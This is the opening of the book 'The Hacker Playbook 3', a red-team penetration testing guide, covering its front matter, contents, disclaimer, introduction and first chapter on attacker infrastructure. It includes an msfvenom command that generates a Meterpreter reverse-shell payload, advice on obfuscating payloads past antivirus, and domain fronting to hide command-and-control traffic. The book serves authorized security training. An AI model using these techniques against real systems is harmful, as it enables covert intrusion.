@@ -1,0 +1,3408 @@
+||||||||||||||||||||||||||||||||||||||||
+
+THE
+HACKER
+PLAYBOOK
+3
+Practical Guide to
+Penetration Testing
+ 
+Red Team Edition
+Peter Kim
+ 
+ 
+ 
+||||||||||||||||||||||||||||||||||||||||
+
+Copyright © 2018 by Secure Planet LLC. All rights reserved. Except as permitted
+under United States Copyright Act of 1976, no part of this publication may be
+reproduced or distributed in any form or by any means, or stored in a database or
+retrieval system, without the prior written permission of the author.
+All rights reserved.
+ISBN-13: 978-1980901754
+ 
+Book design and production by Peter Kim, Secure Planet LLC
+Cover design by Ann Le
+Edited by Kristen Kim
+ 
+Publisher: Secure Planet LLC
+Published: 1st May 2018
+ 
+Dedication
+ 
+To my wife Kristen, our new baby boy, our dog Dexter, and our families.
+Thank you for all of your support and patience,
+even when you had no clue what I was talking about.
+ 
+ 
+ 
+||||||||||||||||||||||||||||||||||||||||
+
+Contents
+Preface
+Notes and Disclaimer
+Introduction
+Penetration Testing Teams vs Red Teams
+Summary
+1 Pregame - The Setup
+Assumed Breach Exercises
+Setting Up Your Campaign
+Setting Up Your External Servers
+Tools of the Trade
+Metasploit Framework
+Cobalt Strike
+PowerShell Empire
+dnscat2
+p0wnedShell
+Pupy Shell
+PoshC2
+Merlin
+Nishang
+Conclusion
+2 Before the Snap - Red Team Recon
+Monitoring an Environment
+Regular Nmap Diffing
+Web Screenshots
+Cloud Scanning
+Network/Service Search Engines
+Manually Parsing SSL Certificates
+Subdomain Discovery
+Github
+Cloud
+Emails
+Additional Open Source Resources
+Conclusion
+3 The Throw - Web Application Exploitation
+Bug Bounty Programs:
+Web Attacks Introduction - Cyber Space Kittens
+The Red Team Web Application Attacks
+Chat Support Systems Lab
+Cyber Space Kittens:  Chat Support Systems
+Setting Up Your Web Application Hacking Machine
+Analyzing a Web Application
+||||||||||||||||||||||||||||||||||||||||
+
+Web Discovery
+Cross-Site Scripting XSS
+Blind XSS
+DOM Based XSS
+Advanced XSS in NodeJS
+XSS to Compromise
+NoSQL Injections
+Deserialization Attacks
+Template Engine Attacks - Template Injections
+JavaScript and Remote Code Execution
+Server Side Request Forgery (SSRF)
+XML eXternal Entities (XXE)
+Advanced XXE - Out Of Band (XXE-OOB)
+Conclusion
+4 The Drive - Compromising the Network
+Finding Credentials from Outside the Network
+Advanced Lab
+Moving Through the Network
+Setting Up the Environment - Lab Network
+On the Network with No Credentials
+Responder
+Better Responder (MultiRelay.py)
+PowerShell Responder
+User Enumeration Without Credentials
+Scanning the Network with CrackMapExec (CME)
+After Compromising Your Initial Host
+Privilege Escalation
+Privilege Escalation Lab
+Pulling Clear Text Credentials from Memory
+Getting Passwords from the Windows Credential Store and Browsers
+Getting Local Creds and Information from OSX
+Living Off of the Land in a Windows Domain Environment
+Service Principal Names
+Querying Active Directory
+Bloodhound/Sharphound
+Moving Laterally - Migrating Processes
+Moving Laterally Off Your Initial Host
+Lateral Movement with DCOM
+Pass-the-Hash
+Gaining Credentials from Service Accounts
+Dumping the Domain Controller Hashes
+Lateral Movement via RDP over the VPS
+Pivoting in Linux
+Privilege Escalation
+||||||||||||||||||||||||||||||||||||||||
+
+Linux Lateral Movement Lab
+Attacking the CSK Secure Network
+Conclusion
+5 The Screen - Social Engineering
+Building Your Social Engineering (SE) Campaigns
+Doppelganger Domains
+How to Clone Authentication Pages
+Credentials with 2FA
+Phishing
+Microsoft Word/Excel Macro Files
+Non-Macro Office Files - DDE
+Hidden Encrypted Payloads
+Exploiting Internal Jenkins with Social Engineering
+Conclusion
+6 The Onside Kick - Physical Attacks
+Card Reader Cloners
+Physical Tools to Bypass Access Points
+LAN Turtle (lanturtle.com)
+Packet Squirrel
+Bash Bunny
+Breaking into Cyber Space Kittens
+QuickCreds
+BunnyTap
+WiFi
+Conclusion
+7 The Quarterback Sneak - Evading AV and Network Detection
+Writing Code for Red Team Campaigns
+The Basics Building a Keylogger
+Setting up your environment
+Compiling from Source
+Sample Framework
+Obfuscation
+THP Custom Droppers
+Shellcode vs DLLs
+Running the Server
+Client
+Configuring the Client and Server
+Adding New Handlers
+Further Exercises
+Recompiling Metasploit/Meterpreter to Bypass AV and Network Detection
+How to Build Metasploit/Meterpreter on Windows:
+Creating a Modified Stage 0 Payload:
+SharpShooter
+Application Whitelisting Bypass
+||||||||||||||||||||||||||||||||||||||||
+
+Code Caves
+PowerShell Obfuscation
+PowerShell Without PowerShell:
+HideMyPS
+Conclusion
+8 Special Teams - Cracking, Exploits, and Tricks
+Automation
+Automating Metasploit with RC scripts
+Automating Empire
+Automating Cobalt Strike
+The Future of Automation
+Password Cracking
+Gotta Crack Em All - Quickly Cracking as Many as You Can
+Cracking the CyberSpaceKittens NTLM hashes:
+Creative Campaigns
+Disabling PS Logging
+Windows Download File from Internet Command Line
+Getting System from Local Admin
+Retrieving NTLM Hashes without Touching LSASS
+Building Training Labs and Monitor with Defensive Tools
+Conclusion
+9 Two-Minute Drill - From Zero to Hero
+10 Post Game Analysis - Reporting
+Continuing Education
+About the Author
+Special Thanks
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+||||||||||||||||||||||||||||||||||||||||
+
+preface
+ 
+This is the third iteration of The Hacker Playbook (THP) series.  Below is an overview
+of all the new vulnerabilities and attacks that will be discussed.  In addition to the new
+content, some attacks and techniques from the prior books (which are still relevant
+today) are included to eliminate the need to refer back to the prior books.  So, what's
+new?  Some of the updated topics from the past couple of years include:
+Abusing Active Directory
+Abusing Kerberos
+Advanced Web Attacks
+Better Ways to Move Laterally
+Cloud Vulnerabilities
+Faster/Smarter Password Cracking
+Living Off the Land
+Lateral Movement Attacks
+Multiple Custom Labs
+Newer Web Language Vulnerabilities
+Physical Attacks
+Privilege Escalation
+PowerShell Attacks
+Ransomware Attacks
+Red Team vs Penetration Testing
+Setting Up Your Red Team Infrastructure
+Usable Red Team Metrics
+Writing Malware and Evading AV
+And so much more
+ 
+Additionally, I have attempted to incorporate all of the comments and
+recommendations received from readers of the first and second books. 
+I do want to
+reiterate that I am not a professional author.   I just love security and love teaching
+security and this is one of my passion projects.  I hope you enjoy it.
+ 
+This book will also provide a more in-depth look into how to set up a lab environment
+in which to test your attacks, along with the newest tips and tricks of penetration
+testing. 
+Lastly, I tried to make this version easier to follow since many schools have
+incorporated my book into their curricula.   Whenever possible, I have added lab
+sections that help provide a way to test a vulnerability or exploit.
+ 
+As with the other two books, I try to keep things as realistic, or “real world”, as
+possible.  I also try to stay away from theoretical attacks and focus on what I have seen
+from personal experience and what actually worked.  I think there has been a major
+||||||||||||||||||||||||||||||||||||||||
+
+shift in the industry from penetration testers to Red Teamers, and I want to 
+show
+ you
+rather than 
+tell
+ you why this is so.  As I stated before, my passion is to teach and
+challenge others.  So, my goals for you through this book are two-fold: first, I want
+you to get into the mindset of an attacker and understand “the how” of the attacks;
+second, I want you to take the tools and techniques you learn and expand upon them. 
+Reading and repeating the labs is only one part – the
+ 
+main lesson I teach to my
+students is to let your work speak for your talents.  Instead of working on your resume
+(of course, you should have a resume), I really feel that having a strong public Github
+repo/technical blog speaks volumes in security over a good resume.  Whether you live
+in the blue defensive or red offensive world, getting involved and sharing with our
+security community is imperative.
+ 
+For those who did not read either of my two prior books, you might be wondering
+what my experience entails.  My background includes more than 12 years of
+penetration testing/red teaming for major financial institutions, large utility companies,
+Fortune 500 entertainment companies, and government organizations. 
+I have also
+spent years teaching offensive network security at colleges, spoken at multiple security
+conferences, been referenced in many security publications, taught courses all over the
+country, ran multiple public CTF competitions, and started my own security school. 
+One of my big passion project was building a free and open security community in
+Southern California called LETHAL (meetup.com/lethal).  Now, with over 800+
+members, monthly meetings, CTF competitions, and more, it has become an amazing
+environment for people to share, learn, and grow.
+ 
+One important note is that I am using both commercial and open source tools. For
+every commercial tool discussed, I try to provide an open source counterpart. I
+occasionally run into some pentesters who claim they only use open source tools. 
+As a
+penetration tester, I find this statement hard to accept. 
+If you are supposed to emulate a
+“real world” attack, the “bad guys” do not have these restrictions; therefore, you need
+to use any tool (commercial or open source) that will get the job done.
+ 
+A question I get often is, who is this book intended for?  It is really hard to state for
+whom this book is specifically intended as I truly believe anyone in security can learn. 
+Parts of this book might be too advanced for novice readers, some parts might be too
+easy for advanced hackers, and other parts might not even be in your field of security. 
+ 
+For those who are just getting into security, one of the most common things I hear
+from readers is that they tend to gain the most benefit from the books after reading
+them for the second or third time (making sure to leave adequate time between reads). 
+There is a lot of material thrown at you throughout this book and sometimes it takes
+time to absorb it all.  So, I would say relax, take a good read, go through the
+labs/examples, build your lab, push your scripts/code to a public Github repository,
+and start up a blog.
+ 
+||||||||||||||||||||||||||||||||||||||||
+
+Lastly, being a Red Team member is half about technical ability and half about having
+confidence.  Many of the social engineering exercises require you to overcome your
+nervousness and go outside your comfort zone.  David Letterman said it best,
+"Pretending to not be afraid is as good as actually not being afraid."  Although this
+should be taken with a grain of salt, sometimes you just have to have confidence, do it,
+and don't look back.
+Notes and Disclaimer
+I can't reiterate this enough: Do not go looking for vulnerable servers and exploits on
+systems you don't own without the proper approval.  Do not try to do any of the attacks
+in this book without the proper approval.  Even if it is for curiosity versus malicious
+intent, you can still get into a lot of trouble for these actions.  There are plenty of bug
+bounty programs and vulnerable sites/VMs to learn off of in order to continue
+growing.  Even for some bug bounty programs, breaking scope or going too far can get
+you in trouble:
+https://www.forbes.com/sites/thomasbrewster/2015/12/17/facebook-instagram-
+security-research-threats/#c3309902fb52
+https://nakedsecurity.sophos.com/2012/02/20/jail-facebook-ethical-hacker/
+https://www.cyberscoop.com/dji-bug-bounty-drone-technology-sean-melia-
+kevin-finisterre/
+ 
+If you ever feel like it's wrong, it's probably wrong and you should ask a lawyer or
+contact the Electronic Frontier Foundation (EFF) (https://www.eff.org/pages/legal-
+assistance).  There is a fine line between research and illegal activities. 
+ 
+Just remember, ONLY test systems on which you have written permission. Just
+Google the term “hacker jailed” and you will see plenty of different examples where
+young teens have been sentenced to years in prison for what they thought was a “fun
+time.” There are many free platforms where legal hacking is allowed and will help you
+further your education.
+ 
+Finally, I am not an expert in Windows, coding, exploit dev, Linux, or really anything
+else.  If I misspoke about a specific technology, tool, or process, I will make sure to
+update the Hacker Playbook Updates webpage (thehackerplaybook.com/updates) for
+anything that is reported as incorrect.  Also, much of my book relies on other people's
+research in the field, and I try to provide links to their original work whenever
+possible.  Again, if I miss any of them, I will update the Updates webpage with that
+information.  We have such an awesome community and I want to make sure everyone
+gets acknowledged for their great work!
+ 
+ 
+ 
+ 
+ 
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+introduction
+ 
+ 
+||||||||||||||||||||||||||||||||||||||||
+
+In the last engagement (The Hacker Playbook 2), you were tasked with breaking into
+the Cyber Kittens weapons facility.  They are now back with their brand new space
+division called Cyber Space Kittens (CSK).  This new division took all the lessons
+learned from the prior security assessment to harden their systems, set up a local
+security operations center, and even create security policies.  They have hired you to
+see if all of their security controls have helped their overall posture.
+ 
+From the little details we have picked up, it looks like Cyber Space Kittens has
+discovered a secret planet located in the Great Andromeda Nebula or Andromeda
+Galaxy.  This planet, located on one of the two spiral arms, is referred to as KITT-3n. 
+KITT-3n, whose size is double that of Earth, resides in the binary system called OI
+31337 with a star that is also twice the size of Earth’s star.  This creates a potentially
+habitable environment with oceans, lakes, plants, and maybe even life…
+ 
+With the hope of new life, water, and another viable planet, the space race is real. 
+CSK has hired us to perform a Red Team assessment to make sure they are secure, and
+capable of detecting and stopping a breach.  Their management has seen and heard of
+all the major breaches in the last year and want to hire only the best.  This is where you
+come in...
+ 
+Your mission, if you choose to accept it, is to find all the external and internal
+vulnerabilities, use the latest exploits, use chained vulnerabilities, and see if their
+defensive teams can detect or stop you. 
+ 
+What types of tactics, threats, and procedures are you going to have to employ?  In this
+campaign, you are going to need to do a ton of reconnaissance and discovery, look for
+weaknesses in their external infrastructure, social engineer employees, privilege
+escalate, gain internal network information, move laterally throughout the network,
+and ultimately exfiltrate KITT-3n systems and databases.
+ 
+Penetration Testing Teams vs Red Team
+s
+Before we can dive into the technical ideals behind Red Teams, I need to clarify my
+definitions of Penetration Testing and Red Teams.  These words get thrown around
+often and can get a little mixed up.  For this book, I want to talk about how I will use
+these two terms.
+ 
+Penetration Testing
+ is the more rigorous and methodical testing of a network,
+application, hardware, etc.  If you haven’t already, I recommend that you read the
+Penetration Testing Execution Standard (PTES: http://www.pentest-standard.org) – it
+is a great walkthrough of how to perform an assessment.  In short, you go through all
+the motions of Scoping, Intel Gathering, Vulnerability Analysis, Exploitation, Post
+Exploitation, and Reporting.  In the traditional network test, we usually scan for
+||||||||||||||||||||||||||||||||||||||||
+
+vulnerabilities, find and take advantage of an exploitable system or application, maybe
+do a little post exploitation, find domain admin, and write up a report.  These types of
+tests create a matrix of vulnerabilities, patching issues, and very actionable results. 
+Even during the scope creation, penetration tests are very well defined, limited to a one
+or two-week assessment period, and are generally announced to the company’s
+internal security teams. 
+Companies still need penetration testers to be a part of their
+secure software development life cycle (S-SDLC).
+ 
+Nowadays, even though companies have vulnerability management programs, S-
+SDLC programs, penetration testers, incident response teams/programs, and many of
+the very expensive security tools, they still get compromised.  If we look at any of the
+recent breaches (http://www.informationisbeautiful.net/visualizations/worlds-biggest-
+data-breaches-hacks), we see that many of these happened to very large and mature
+companies.   We have seen in other security reports that some compromises could have
+lasted longer than 6 months before they were detected
+(https://en.wikipedia.org/wiki/Sony_Pictures_hack).  There are also some reports that
+state that almost one-third of all businesses were breached in 2017
+(https://www.esecurityplanet.com/network-security/almost-a-third-of-all-u.s.-
+businesses-were-breached-in-2017.html).  The questions I want companies to ask are if
+these exact same bad guys or actor sets came after your company with the exact same
+tactics, could you detect it, how long would it take, could you recover from it, and
+could you figure out exactly what they did?
+ 
+This is where 
+Red Teams
+ come into play.  The Red Team’s mission is to emulate the
+tactics, techniques, and procedures (TTPs) by adversaries.  The goals are to give real
+world and hard facts on how a company will respond, find gaps within a security
+program, identify skill gaps within employees, and ultimately increase their security
+posture. 
+ 
+For Red Teams, it is not as methodical as penetration tests.  Since we are simulating
+real world events, every test can differ significantly.  Some campaigns might have a
+focus on getting personally identifiable information (PII) or credit cards, while others
+might focus on getting domain administrative control.  Speaking of domain admin, this
+where I see a huge difference between Penetration Tests and Red Team campaigns. 
+For network pentests, we love getting to Domain Admin (DA) to gain access to the
+Domain Controller (DC) and calling it a day.  For Red Team campaigns, based on the
+campaign, we may ignore the DC completely.  One reason for this is that we are seeing
+many companies placing a lot of protection around their DCs.  They might have
+application whitelisting, integrity monitoring, lots of IDS/IPS/HIPS rules, and even
+more.  Since our mission is not to get caught, we need to stay low key.  Another rule
+we follow is that we almost never run a vulnerability scan against the internal
+network.  How many adversaries have you seen start to perform full vulnerability
+scans once inside a compromised environment?  This is extremely rare.  Why? 
+Vulnerability scans are very loud on the network and will most likely get caught in
+||||||||||||||||||||||||||||||||||||||||
+
+today’s world. 
+ 
+Another major difference in the scope is the timeline.  With penetration tests, we are
+lucky to get two weeks, if not one.  Whereas, Red Teams must build campaigns that
+last from 2 weeks to 6 months.  This is because we need to simulate real attacks, social
+engineering, beaconing, and more.  Lastly, the largest difference is the outcome of the
+two types of teams.  Instead of a list of vulnerabilities, Red Team findings need to be
+geared more toward gaps in blue team processes, policies, tools, and skills.  In your
+final report, you may have some vulnerability findings that were used for the
+campaign, but most findings will be gaps in the security program.  Remember findings
+should be mainly for the security program, not IT.
+ 
+Penetration Tests
+Red Teams
+Methodical Security Assessments:
+Pre-engagement Interactions
+Intelligence Gathering
+Vulnerability Analysis
+Exploitation
+Post Exploitation
+Reporting
+ 
+Flexible Security Assessments:
+Intelligence Gathering
+Initial Foothold
+Persistence/Local Privilege
+Escalation
+Local/Network Enumeration
+Lateral Movement
+Data Identification/Exfiltration
+Domain Privilege
+Escalation/Dumping Hashes
+Reporting
+Scope:
+Restrictive Scope
+1-2 Week Engagement
+Generally Announced
+Identify vulnerabilities
+Scope:
+No Rules*
+1 Week – 6 Month
+Engagement
+No announcement
+Test Blue teams on program,
+policies, tools, and skills
+*Can’t be illegal…
+ 
+With Red Teams, we need to show value back to the company.  It isn’t about the
+number of total vulnerability counts or criticality of individual vulnerabilities; it is
+about proving how the security program is running.  The goal of the Red Team is to
+simulate real world events that we can track.  Two strong metrics that evolve from
+these campaigns are Time To Detect (TTD) and Time To Mitigate (TTM).  These are
+not new concepts, but still valuable ones for Red Teams. 
+ 
+What does Time To Detect (TTD) mean?  It is the time between the initial occurrence
+of the incident to when an analyst detects and starts working on the incident.  Let’s say
+you have a social engineering email and the user executes malware on their system. 
+Even though their AV, host-based security system, or monitoring tools might trigger,
+||||||||||||||||||||||||||||||||||||||||
+
+the time recorded is when the analyst creates that first ticket. 
+ 
+Time To Mitigate (TTM) is the secondary metric to record.  This timeline is recorded
+when the firewall block, DNS sinkhole, or network isolation is implemented.  The
+other valuable information to record is how the Security Teams work with IT, how
+management handles a critical incident, and if employees panic.  With all this data, we
+can build real numbers on how much your company is at risk, or how likely it is to be
+compromised. 
+ 
+Summary
+The big push I want to make is for managers to get outside the mentality of relying on
+metrics from audits.  We all have reasons for compliance and they can definitely help
+mature our programs, but they don't always provide real world security for a
+company.  As Red Teamers, our job is to test if the overall security program is
+working.
+ 
+As you read through this book, I want you to put yourself in the Red Team mindset
+and focus on:
+Vulnerabilities in Security not IT
+Simulate Real World events
+Live in a world of constant Red Team infections
+ 
+Challenge the system…  Provide 
+real
+ data to prove security gaps.
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+ 
+1 pregame - the setup
+ 
+ 
+ 
+ 
+ 
+||||||||||||||||||||||||||||||||||||||||
+
+As a Red Team, we don’t really care as much about the origins of an attack. Instead,
+we want to learn from the TTPs.  For example, looking at public sources, we found a
+detailed report from FireEye on an attack they analyzed
+(https://www2.fireeye.com/rs/848-DID-242/images/rpt-apt29-hammertoss.pdf). 
+Reviewing their analysis, we can see that the TTPs of the malware used Twitter as part
+of the Command and Control (C2), images with encryption keys, GitHub, and
+steganography.  This is where we would build a similar campaign to see if your
+company could detect this attack.
+ 
+A detailed breakdown for APT attacks is MITRE’s Adversarial Tactics, Techniques,
+and Common Knowledge (ATT&CK) matrix.  This is a large collection of different
+TTPs commonly used with all sorts of attacks.
+ 
+ 
+Another resource is this running list of APT Groups and Operations document from
+@cyb3rops.  This Google Document (http://bit.ly/2GZb8eW) breaks down different
+suspected APT groups and their toolsets.  This is a useful list for us as Red Teamers to
+simulate different attacks.  Of course, we might not use the same tools as documented
+in the reports, but we may build similar tools that will do the same thing.
+ 
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+Assumed Breach Exercises
+Companies need to live in a world today where they start with the assumption that they
+have already been breached.  These days, too many companies assume that because of
+some check box or annual penetration test, they are secure.  We need to get in a state
+of mind where we are always hunting, assuming evil is lurking around, and looking for
+these anomalies. 
+ 
+This is where Red Team campaigns heavily differ from penetration tests.  Since Red
+Team campaigns focus on detection/mitigation instead of vulnerabilities, we can do
+some more unique assessments.  One assessment that provides customers/clients with
+immense benefit is called an assumed breach exercise.  In an assumed breach exercise,
+the concept is that there will always be 0-days.  So, can the client identify and mitigate
+against secondary and tertiary steps?
+ 
+In these scenarios, Red Teams work with a limited group of people inside the company
+to get a single custom malware payload to execute on their server.  This payload
+should try to connect out in multiple ways, make sure to bypass common AV, and
+allow for additional payloads to be executed from memory.  We will have example
+payloads throughout the book.  Once the initial payload is executed, this is where all
+the fun begins!
+ 
+Setting Up Your Campaign
+This is one of my favorite parts of running Red Teams.  Before you compromise your
+first system, you need to scope out your Red Team campaign.  In a lot of penetration
+tests, you are given a target and you continually try to break into that single system.  If
+something fails, you go on to the next thing.  There is no script and you are usually
+pretty focused on that network.
+ 
+In Red Team campaigns, we start out with a few objectives.  These objectives can
+include, but are not limited to:
+What are the end goal goals?  Is it just APT detection?  Is it to get a flag on a
+||||||||||||||||||||||||||||||||||||||||
+
+server? 
+Is it to get data from a database? 
+Or is it just to get TTD metrics?
+Is there a public campaign we want to copy?
+What techniques are you going to use?  We talked about using MITRE
+ATT&CK Matrix, but what are the exact techniques in each category? 
+The team at Red Canary supplied detailed information on each one of
+these techniques.  I highly recommend you take time and review them
+all:  http://bit.ly/2H0MTZA
+What tools does the client want you to use?  Will it be COTS offensive tools
+like Metasploit, Cobalt Strike, DNS Cat?  Or custom tools?
+ 
+The best part is that getting caught is part of the assessment.  There are some
+campaigns where we get caught 4 or 5 times and have to burn 4 or 5 different
+environments.  This really shows to your client that their defenses are working (or not
+working) based on what results they expected.  At the end of the book, I will provide
+some reporting examples of how we capture metrics and report that data.
+ 
+Setting Up Your External Servers
+There are many different services that we use for building our campaigns.  In today's
+world with the abundance of Virtual Private Servers (VPS), standing up your attacker
+machines on the internet won't break your budget.   For example, I commonly use
+Digital Ocean Droplets (https://www.digitalocean.com/products/compute) or Amazon
+Web Services (AWS) Lightsail servers (https://lightsail.aws.amazon.com) to configure
+my VPS servers.  The reasons I use these services are because they are generally very
+low cost (sometimes free), allow for Ubuntu servers, allow for servers in all sorts of
+regions, and most importantly, are very easy to set up.  Within minutes, you can have
+multiple servers set up and running Metasploit and Empire services.
+ 
+I am going to focus on AWS Lightsail servers in this book, due to the ease in setting
+up, ability to automate services, and the amount of traffic normally going to AWS. 
+After you have fully created an image you like, you can rapidly clone that image to
+multiple servers, which makes it extremely easy to build ready-made Command and
+Control boxes.
+ 
+Again, you should make sure you abide by the VPS provider's service terms (i.e.
+https://aws.amazon.com/service-terms/) so you do not fall into any problems.
+ 
+https://lightsail.aws.amazon.com/
+Create an Instance
+I highly recommend getting at least 1 GB of RAM
+Storage space usually isn't an issue
+Linux/Unix
+OS Only -> Ubuntu
+Download Cert
+||||||||||||||||||||||||||||||||||||||||
+
+chmod 600 cert
+ssh -i cert ubuntu@[ip] 
+ 
+Once you are logged into your server, you need to install all the tools as efficiently and
+repeatable as possible.  This is where I recommend that you develop your own scripts
+to set up things such as IPTables rules, SSL certs, tools, scripts, and more.  A quick
+way to build your servers is to integrate TrustedSec's The PenTesters Framework
+(PTF).  This collection of scripts (https://github.com/trustedsec/ptf) does a lot of the
+hard work for you and creates a framework for everything else.  Let's walk through a
+quick example of installing all of our exploitation, intel gathering, post exploitation,
+PowerShell, and vulnerability analysis tools.
+sudo su -
+apt-get update
+apt-get install python
+git clone https://github.com/trustedsec/ptf /opt/ptf
+cd /opt/ptf && ./ptf
+use modules/exploitation/install_update_all
+use modules/intelligence-gathering/install_update_all
+use modules/post-exploitation/install_update_all
+use modules/powershell/install_update_all
+use modules/vulnerability-analysis/install_update_all
+cd /pentest
+ 
+The following image shows all the different modules available, some of which we
+installed.
+ 
+Image of all available modules
+ 
+If we take a look at our attacker VPS, we can see all of the tools installed on our box. 
+If we wanted to start up Metasploit, we can just type: 
+msfconsole
+.
+ 
+||||||||||||||||||||||||||||||||||||||||
+
+All tools installed under /pentest
+ 
+One thing I still recommend is setting up strong IPTables rules.  Since this will be your
+attacker server, you will want to limit where SSH authentications can initiate from,
+where Empire/Meterpreter/Cobalt Strike payloads can come from, and any phishing
+pages you stand up.
+ 
+If you remember back in late 2016, someone had found an unauthenticated Remote
+Code Execution (RCE) on Cobalt Strike Team Server
+(https://blog.cobaltstrike.com/2016/09/28/cobalt-strike-rce-active-exploitation-
+reported/).  You definitely don't want your attacker servers compromised with your
+customer's data.
+ 
+I have also seen some Red Teams run Kali Linux (or at least Metasploit) in Docker
+inside AWS (http://bit.ly/2qz2vN9).  From my point of view, there is no wrong way to
+create your systems.  What you do want is to create an efficient and repeatable process
+to deploy multiple machines.  The best part of using Lightsail is that once you have
+your machine configured to your preferences, you can take a snapshot of a machine
+and stand up multiple, brand new instances of that image. 
+ 
+If you want to get your environment to the next level, check out the team at Coalfire-
+Research.  They built custom modules to do all the hard work and automation for you. 
+Red Baron is a set of modules and custom/third-party providers for Terraform, which
+tries to automate the creation of resilient, disposable, secure, and agile infrastructure
+for Red Teams [https://github.com/Coalfire-Research/Red-Baron].  Whether you want
+to build a phishing server, Cobalt Strike infrastructure, or create a DNS C2 server, you
+can do it all with Terraform. 
+ 
+Take a look at https://github.com/Coalfire-Research/Red-Baron and check out all the
+different modules to quickly build your own infrastructure.
+ 
+Tools of the Trade
+There are a myriad of tools a Red Team might use, but let’s talk about some of the
+core resources.  Remember that as a Red Teamer, the purpose is not to compromise an
+environment (which is the most fun), but to replicate real world attacks to see if a
+customer is protected and can detect attacks in a very short timeframe.  In the previous
+chapters, we identified how to replicate an attacker's profile and toolset, so let’s review
+over some of the most common Red Team tools.
+||||||||||||||||||||||||||||||||||||||||
+
+Metasploit Framework
+This book won't dive too deeply into Metasploit as it did in the prior books. 
+Metasploit Framework is still a gold standard tool even though it was originally
+developed in 2003.  This is due to both the original creator, H.D. Moore, and the very
+active community that supports it.  This community-driven framework
+(https://github.com/rapid7/metasploit-framework/commits/master), which seems to be
+updated daily, has all of the latest public exploits, post exploitation modules, auxiliary
+modules, and more. 
+ 
+For Red Team engagements, we might use Metasploit to compromise internal systems
+with the MS17-010 Eternal Blue Exploit (http://bit.ly/2H2PTsI) to get our first shell or
+we might use Metasploit to generate a Meterpreter payload for our social engineering
+attack. 
+ 
+In the later chapters, we are going to show you how to recompile your Metasploit
+payloads and traffic to bypass AV and network sensors.
+Obfuscating Meterpreter Payloads
+If we are performing some social engineering attack, we might want to use a Word or
+Excel document as our delivery mechanism.  However, a potential problem is that we
+might not be able to include a Meterpreter payload binary or have it download one
+from the web, as AV might trigger on it.  Also, a simple solution is obfuscation using
+PowerShell:
+msfvenom --payload windows/x64/meterpreter_reverse_http --format psh --out
+meterpreter-64.ps1 LHOST=127.0.0.1
+ 
+We can even take this to the next level and use tools like Unicorn
+(https://github.com/trustedsec/unicorn) to generate more obfuscated PowerShell
+Meterpreter payloads, which we will be covered in more detail as we go through the
+book.
+ 
+ 
+Additionally, using signed SSL/TLS certificates by a trusted authority could help us
+get around certain network IDS tools:  https://github.com/rapid7/metasploit-
+framework/wiki/Meterpreter-Paranoid-Mode.
+ 
+Finally, later in the book, we will go over how to re-compile Metasploit/Meterpreter
+from scratch to evade both host and network based detection tools.
+ 
+||||||||||||||||||||||||||||||||||||||||
+
+Cobalt Strike
+Cobalt Strike is by far one of my favorite Red Team simulation tools.  What is Cobalt
+Strike? 
+It is a tool for post exploitation, lateral movement, staying hidden in the
+network, and exfiltration.  Cobalt Strike doesn't really have exploits and isn't used for
+compromising a system via the newest 0-day vulnerability.  Where you really see its
+extensive features and powers is when you already have code execution on a server or
+when it is used as part of a phishing campaign payload.  Once you can execute a
+Cobalt Strike payload, it creates a Beacon connection back to the Command and
+Control server.
+ 
+New Cobalt Strike licenses cost $3,500 per user for a one-year license, so it is not a
+cheap tool to use.  There is a free limited trial version available.
+Cobalt Strike Infrastructure
+As mentioned earlier, in terms of infrastructure, we want to set up an environment that
+is reusable and highly flexible.  Cobalt Strike supports redirectors so that if your C2
+domain is burned, you don't have to spin up a whole new environment, only a new
+domain.  You can find more on using socat to configure these redirectors here:
+http://bit.ly/2qxCbCZ and http://bit.ly/2IUc4Oe.
+ 
+ 
+To take your redirectors up a notch, we utilize Domain Fronting.  Domain Fronting is a
+collection of techniques to make use of other people’s domains and infrastructures as
+redirectors for your controller (http://bit.ly/2GYw55A).  This can be accomplished by
+utilizing popular Content Delivery Networks (CDNs) such as Amazon’s CloudFront or
+other Google Hosts to mask traffic origins.  This has been utilized in the past by
+different adversaries (http://bit.ly/2HoCRFi).  
+ 
+Using these high reputation domains, any traffic, regardless of HTTP or HTTPS, will
+look like it is communicating to these domains instead of our malicious Command and
+||||||||||||||||||||||||||||||||||||||||
+
+Control servers.  How does this all work?  Using a very high-level example, all your
+traffic will be sent to one of the primary Fully Qualified Domain Names (FQDNs) for
+CloudFront, like a0.awsstatic.com, which is CloudFront's primary domain.  Modifying
+the host header in the request will redirect all the traffic to our CloudFront distribution,
+which will ultimately forward the traffic to our Cobalt Strike C2 server
+(http://bit.ly/2GYw55A
+)
+.
+ 
+ 
+By changing the HTTP Host header, the CDN will happily route us to the correct
+server. 
+Red Teams have been using this technique for hiding C2 traffic by using high
+reputation redirectors.
+ 
+Two other great resources on different products that support Domain Fronting:
+CyberArk also wrote an excellent blog on how to use Google App products to
+look like your traffic is flowing through www.google.com, mail.google.com, or
+docs.google.com here: http://bit.ly/2Hn7RW4.
+Vincent Yiu wrote an article on how to use Alibaba CDN to support his domain
+fronting attacks: http://bit.ly/2HjM3eH.
+Cobalt Strike isn't the only tool that can support Domain Fronting, this can also
+be accomplished with Meterpreter https://bitrot.sh/post/30-11-2017-domain-
+fronting-with-meterpreter/.
+ 
+Note: At the time of publishing this book, AWS (and even Google) have starting
+implementing protections against domain fronting (https://amzn.to/2I6lSry).  This
+doesn't stop this type of attack, but would require different third party resources to
+abuse.
+ 
+Although not part of the infrastructure, it is important to understand how your beacons
+work within an internal environment.  In terms of operational security, we don’t want
+to build a campaign that can be taken out easily.  As a Red Teamer, we have to assume
+||||||||||||||||||||||||||||||||||||||||
+
+that some of our agents will be discovered by the Blue Team.  If we have all of our
+hosts talking to one or two C2 endpoints, it would be pretty easy to take out our entire
+infrastructure.  Luckily for us, Cobalt Strike supports SMB Beacons between hosts for
